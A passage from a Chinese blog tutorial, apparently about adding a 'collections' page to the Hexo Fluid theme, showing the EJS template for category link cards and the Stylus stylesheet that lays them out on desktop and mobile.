#D4D4D4"> || </span><span style="color: #DCDCAA">__</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'collections.subtitle'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">banner_img</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">banner_img</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">banner_img_height</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">banner_img_height</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">banner_mask_alpha</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">banner_mask_alpha</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">comment</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">comments</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">type</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 标题层级，默认 h4</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">headingLevel</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">min</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">6</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">max</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">heading_level</span><span style="color: #D4D4D4"> || </span><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4">))</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">headingTag</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`h</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">headingLevel</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span></span><span class="line"><span style="color: #D4D4D4">%&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collections-container"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  &lt;% for(const category of theme.collections.categories || []) </span><span style="color: #569CD6">{</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;&lt;%= </span><span style="color: #9CDCFE">headingTag</span><span style="color: #D4D4D4"> %&gt; </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-category"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;%= </span><span style="color: #9CDCFE">category</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;/&lt;%= </span><span style="color: #9CDCFE">headingTag</span><span style="color: #D4D4D4"> %&gt;&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-row"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;% for(const item of category.items || []) </span><span style="color: #569CD6">{</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-card"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">a</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">href</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"&lt;%= url_for(item.link) %&gt;"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"card-body"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"_blank"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">rel</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"noopener"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;% if (item.avatar || item.image) </span><span style="color: #569CD6">{</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-avatar"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"&lt;%= url_for(item.avatar || item.image) %&gt;"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"&lt;%= item.title %&gt;"</span></span><span class="line"><span style="color: #D4D4D4">                     </span><span style="color: #9CDCFE">onerror</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"this.onerror=null;this.src='&lt;%= url_for(theme.collections.onerror_avatar) %&gt;'"</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            &lt;% </span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-content"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-title"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">&lt;%= item.title %&gt;</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-intro"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">&lt;%= item.intro || '' %&gt;</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">a</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;% </span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  &lt;% </span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> %&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&lt;% </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">custom</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">custom</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">enable</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">custom</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">) { %&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"collection-custom mx-auto"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;%- theme.collections.custom.content %&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;% } %&gt;</span></span></code></pre></div></div></figure><p>修改之后的 <code>collections.ejs</code> 主要是将前者的关键字替换成 <code>collections</code> 并增加了一个必要的元素节点 <code>headingTag</code> 用来渲染分类标题，并取消了评论注入节点。</p><h2 id="创建styl样式文件"><a class="markdownIt-Anchor" href="#创建styl样式文件"></a> 创建 styl 样式文件</h2><p>渲染模板有了，接下来还需要创建 styl 文件用于样式定义。</p><p>友情链接的样式文件 <code>links.styl</code> 在：<code>Blog\node_modules\hexo-theme-fluid\source\css\_pages</code> 目录下的<code>_links</code> 文件夹中。</p><p>于是我们如法炮制，在<code>_pages</code> 目录下创建<code>_collections</code> 文件夹用于存放<code>_collections.styl</code> 文件。文件内容如下：</p><figure class="shiki stylus"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.collections-container</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1rem</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-category</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1.5rem</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0.75rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1.5rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-weight</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">bold</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--card-border-color</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--text-color</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">left</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-row</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">flex</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-wrap</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">wrap</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">gap</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">flex-start</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-card</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">box-shadow</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">none</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">transparent</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 修改为只在桌面端生效</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">@media</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">min-width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">768px</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">calc</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">33.333%</span><span style="color: #D4D4D4"> - </span><span style="color: #B5CEA8">1rem</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">max-width</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">calc</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">33.333%</span><span style="color: #D4D4D4"> - </span><span style="color: #B5CEA8">1rem</span><span style="color: #D4D4D4">)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.card-body</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">.3rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">flex</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">flex-start</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 修改为顶部对齐</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">100%</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">min-height</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">80px</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 替代固定高度</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">transition</span><span style="color: #D4D4D4"> background-color </span><span style="color: #B5CEA8">0.2s</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ease-in-out</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    &amp;</span><span style="color: #D7BA7D">:hover</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--card-hover-bg</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.collection-avatar</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">scale</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">1.1</span><span style="color: #D4D4D4">)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-avatar</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">none</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">45px</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">45px</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">.75rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">object-fit</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">cover</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">transition-duration</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">.2s</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">transition-timing-function</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ease-in-out</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">img</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">100%</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">100%</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">50%</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">transparent</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">object-fit</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">cover</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.card-content</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">flex</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">100%</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 移除固定高度</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-content</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">flex</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">column</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">center</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">min-width</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 修复flex布局溢出问题</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-title</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--text-color</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-weight</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">bold</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 移动端允许换行</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">@media</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">max-width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">767px</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">white-space</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">normal</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">word-break</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">break-word</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 桌面端单行省略</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">@media</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">min-width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">768px</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">hidden</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-overflow</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ellipsis</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">white-space</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">nowrap</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-intro</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0.85rem</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1.2</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">var</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">--sec-text-color</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 统一使用webkit多行省略</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> -webkit-box</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">-webkit-box-orient</span><span style="color: #D4D4D4"> vertical</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">-webkit-line-clamp</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">2</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-overflow</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ellipsis</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">hidden</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 移动端专属样式</span></span><span class="line"><span style="color: #C586C0">@media</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">max-width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">767px</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-row</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">column</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">stretch</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 改为拉伸填满</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">gap</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1.5rem</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 增加垂直间距</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.collection-card</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">max-width</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 改为100%填充父容器</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 自动伸缩</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5%</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 左右留白替代max-width</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.card-body</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1.25rem</span><span 